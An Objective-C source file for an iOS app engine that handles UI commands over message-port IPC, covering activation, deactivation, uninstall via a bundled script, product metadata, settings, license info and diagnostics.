//
//  AppEngineConnection.m
//  AppEngine
//
//  Created by Makara Khloth on 11/19/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngineConnection.h"
#import "AppEngine.h"
#import "AppEngineUICmd.h"
#import "PreferencesData.h"

// Components headers
#import "ComponentHeaders.h"

// Socket IPC
#import "SocketIPCSender.h"
#import "ProductMetaData.h"
#import "ProductActivationData.h"
#import "MessagePortIPCSender.h"

#import "DefStd.h"

@interface AppEngineConnection (private)
- (void) sendDataToUI: (NSData*) aData;
- (void) sendActivationFailureToUI: (NSData *) aData;

@end

@implementation AppEngineConnection

- (id) initWithAppEngine: (AppEngine*) aAppEngine {
	if ((self = [super init])) {
		mAppEngine = aAppEngine;
		[mAppEngine retain];
		
		// Listen to UI command
//		mEngineSocket = [[SocketIPCReader alloc] initWithPortNumber:kAppUISendSocketPort andAddress:kLocalHostIP withSocketDelegate:self];
//		[mEngineSocket start];
		mEngineMessagePort = [[MessagePortIPCReader alloc] initWithPortName:kAppUISendMessagePort withMessagePortIPCDelegate:self];
		[mEngineMessagePort start];
	}
	return (self);
}

- (void) processCommand: (NSInteger) aCmdId withCmdData: (id) aCmdData {
	NSInteger command = aCmdId;
	NSMutableData *commandData = [NSMutableData data];
	[commandData appendBytes:&command length:sizeof(NSInteger)];
	switch (aCmdId) {
		case kAppUI2EngineGetLicenseInfoCmd: {
			LicenseInfo *licInfo = aCmdData;
			NSData *licInfoData = [licInfo transformToData];
			[commandData appendData:licInfoData];
			[self sendDataToUI:commandData];
		} break;
		default:
			break;
	}
}

// Socket IPC
- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
	DLog(@"(AppEngine) dataDidReceivedFromSocket")
}

// Message port IPC
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	// First 4 bytes always command
	NSInteger uiCommand = kAppUI2EngineUnknownCmd;
	if (aRawData) {
		NSInteger location = 0;
		[aRawData getBytes:&uiCommand length:sizeof(NSInteger)];
		location += sizeof(NSInteger);
		DLog(@"(AppEngine) dataDidReceivedFromMessagePort uiCommand: %d", uiCommand)
		NSRange range = NSMakeRange(location, [aRawData length] -location);
		
		NSMutableData *responseData = [NSMutableData data];
		[responseData appendBytes:&uiCommand length:sizeof(NSInteger)];
		
		switch (uiCommand) {
			case kAppUI2EngineActivateCmd: {
				// Activate
				NSData *commandData = [aRawData subdataWithRange:range];
				NSInteger location = 0;
				NSInteger length = 0;
				[commandData getBytes:&length length:sizeof(NSInteger)];
				location += sizeof(NSInteger);
				NSString *activationCode = [[NSString alloc] initWithData:[commandData subdataWithRange:NSMakeRange(location, length)] encoding:NSUTF8StringEncoding];
				DLog(@"activationCode: %@", activationCode)
				ActivationInfo *activationInfo = [[ActivationInfo alloc] init];
				[activationInfo setMActivationCode:activationCode];
				[activationInfo setMDeviceInfo:[[[mAppEngine mApplicationContext] getPhoneInfo] getDeviceInfo]];
				[activationInfo setMDeviceModel:[[[mAppEngine mApplicationContext] getPhoneInfo] getDeviceModel]];
				BOOL isSubmit = [[mAppEngine mActivationManager] activate:activationInfo andListener:self];
				DLog(@"isSubmit: %d", isSubmit)
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
				[activationInfo release];
				[activationCode release];
			} break;
			case kAppUI2EngineRequestActivateCmd: {
				// Request activate
				BOOL isSubmit = [[mAppEngine mActivationManager] requestActivate:self];
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
			} break;
			case kAppUI2EngineDeactivateCmd: {
				// Deactivate
				BOOL isSubmit = [[mAppEngine mActivationManager] deactivate:self];
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
			} break;
			case kAppUI2EngineUninstallCmd: {
				// Uninstall
				NSBundle *bundle = [NSBundle mainBundle];
				if (bundle) {
					NSString *bundleResourcePath = [bundle resourcePath];
					NSString *uninstallPath = [bundleResourcePath stringByAppendingString:@"/Uninstall.sh"];
					NSString *executeUninstallScript = [NSString stringWithFormat:@"launchctl submit -l com.app.ssmp.rm -p  %@ start ssmp-remove-daemon", uninstallPath];
					DLog(@"executeUninstallScript: %@", executeUninstallScript)
					system([executeUninstallScript cStringUsingEncoding:NSUTF8StringEncoding]);
					exit(0);
				}
			} break;
			case kAppUI2EngineGetAboutCmd: {
				// Get about
				ProductMetaData *pMetaData = [[ProductMetaData alloc] init];
				[pMetaData setMConfigID:[[mAppEngine mLicenseManager] getConfiguration]];
				[pMetaData setMProductID:[[[mAppEngine mApplicationContext] getProductInfo] getProductID]];
				[pMetaData setMProtocolLanguage:[[[mAppEngine mApplicationContext] getProductInfo] getLanguage]];
				[pMetaData setMProtocolVersion:[[[mAppEngine mApplicationContext] getProductInfo] getProtocolVersion]];
				[pMetaData setMProductVersion:[[[mAppEngine mApplicationContext] getProductInfo] getProductVersion]];
				[pMetaData setMProductName:[[[mAppEngine mApplicationContext] getProductInfo] getProductName]];
				[pMetaData setMProductDescription:[[[mAppEngine mApplicationContext] getProductInfo] getProductDescription]];
				[pMetaData setMProductLanguage:[[[mAppEngine mApplicationContext] getProductInfo] getProductLanguage]];
				[pMetaData setMLicenseHashTail:[[[mAppEngine mApplicationContext] getProductInfo] getProtocolHashTail]];
				[pMetaData setMProductVersionDescription:[[[mAppEngine mApplicationContext] getProductInfo] getProductVersionDescription]];
				NSData *metaData = [pMetaData transformToData];
				[responseData appendData:metaData];
				[self sendDataToUI:responseData];
				[pMetaData release];
			} break;
			case kAppUI2EngineGetCurrentSettingsCmd: {
				// Get current settings
				PreferencesData *pData = [[PreferencesData alloc] init];
				NSData *preferenceData = [pData transformToDataFromPrefereceManager:[mAppEngine mPreferenceManager]];
				[responseData appendData:preferenceData];
				[self sendDataToUI:responseData];
				[pData release];
			} break;
			case kAppUI2EngineGetLastConnectionsCmd: {
				// Get last connections
				NSData *connectionLogsData = [[mAppEngine mConnectionHistoryManager] transformAllConnectionHistoryToData];
				[responseData appendData:connectionLogsData];
				[self sendDataToUI:responseData];
			} break;
			case kAppUI2EngineGetLicenseInfoCmd: {
				// Get license info
				NSData *licInfoData = [[[mAppEngine mLicenseManager] mCurrentLicenseInfo] transformToData];
				[responseData appendData:licInfoData];
				[self sendDataToUI:responseData];
			} break;
			case kAppUI2EngineGetDiagnosticCmd: {
				NSData *eventCountData = [[[mAppEngine mERM] eventCount] transformToData];
				NSData *dbHealthInfoData = [[[mAppEngine mERM] dbHealthInfo] transformToData];
				NSArray *allConnectionHistory = [[mAppEngine mConnectionHistoryManager] selectAllConnectionHistory];
				ConnectionLog *lastConnectionLog = [allConnectionHistory lastObject];
				NSString *lastConnectionTime = [lastConnectionLog mDateTime];
				NSInteger length = [eventCountData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:eventCountData];
				DLog(@"length: %d", length)
				DLog(@"eventCountData: %@", eventCountData)
				length = [dbHealthInfoData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:dbHealthInfoData];
				DLog(@"length: %d", length)
				DLog(@"dbHealthInfoData: %@", dbHealthInfoData)
				length = [lastConnectionTime lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:[lastConnectionTime dataUsingEncoding:NSUTF8StringEncoding]];
				DLog(@"length: %d", length)
				[self sendDataToUI:responseData];
			} break;
			default:
				break;
		}
	}
}

// Activation manager
- (void) onComplete:(ActivationResponse *)aActivationResponse {
	DLog(@"aActivationResponse.isMSuccess: %d", [aActivationResponse isMSuccess])
	NSInteger command = kAppUI2EngineUnknownCmd;
	if ([aActivationResponse mEchoCommand] == SEND_ACTIVATE) {
		command = kAppUI2EngineActivateCmd;
	} else if ([aActivationResponse mEchoCommand] == GET_ACTIVATION_CODE) {
		command = kAppUI2EngineRequestActivateCmd;
	} else {
		command = kAppUI2EngineDeactivateCmd;
	}
	NSMutableData *responseData = [NSMutableData data];
	[responseData appendBytes:&command length:sizeof(NSInteger)];
	ProductActivationData *pActivationData = [[ProductActivationData alloc] init];
	[pActivationData setMIsSuccess:[aActivationResponse isMSuccess]];
	if ([aActivationResponse isMSuccess]) {
		[pActivationData setMErrorCode:[aActivationResponse mResponseCode]];
	} else {
		if ([aActivationResponse mHTTPStatusCode] != 0) {
			[pActivationData setMErrorCode:[aActivationResponse mHTTPStatusCode]];
		} else {
			[pActivationData setMErrorCode:[aActivationResponse mResponseCode]];
		}
	}
	[pActivationData setMErrorCategory:kFxErrorNone];
	[pActivationData setMErrorDescription:[aActivationResponse mMessage]];
	[pActivationData setMLicenseInfo:[[mAppEngine mLicenseManager] mCurrentLicenseInfo]];
	NSData *data = [pActivationData transformToData];
	[responseData appendData:data];
	[self sendDataToUI:responseData];
	[pActivationData release];
}

- (void) sendDataToUI: (NSData*) aData {
	DLog(@"aData: %@", aData)
//	SocketIPCSender* socketSender = [[SocketIPCSender alloc] initWithPortNumber:kAppEngineSendSocketPort andAddress:kLocalHostIP];
//	[socketSender writeDataToSocket:aData];
//	[socketSender release];
	
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kAppEngineSendMessagePort];
	[messagePortSender writeDataToPort:aData];
	[messagePortSender release];
}

- (void) sendActivationFailureToUI: (NSData *) aData {
	NSMutableData *responseData = [NSMutableData dataWithData:aData];
	ProductActivationData *pActivationData = [[ProductActivationData alloc] init];
	[pActivationData setMErrorCode:kActivationManagerBusy];
	[pActivationData setMErrorCategory:kFxErrorActivationManager];
	[pActivationData setMErrorDescription:NSLocalizedString(@"kActivationManagerBusyInvalidActivationInfo", @"")];
	NSData *data = [pActivationData transformToData];
	[responseData appendData:data];
	[self sendDataToUI:responseData];
	[pActivationData release];
}

- (void) dealloc {
	[mEngineMessagePort release];
	[mEngineSocket release];
	[mAppEngine release];
	[super dealloc];
}

@end
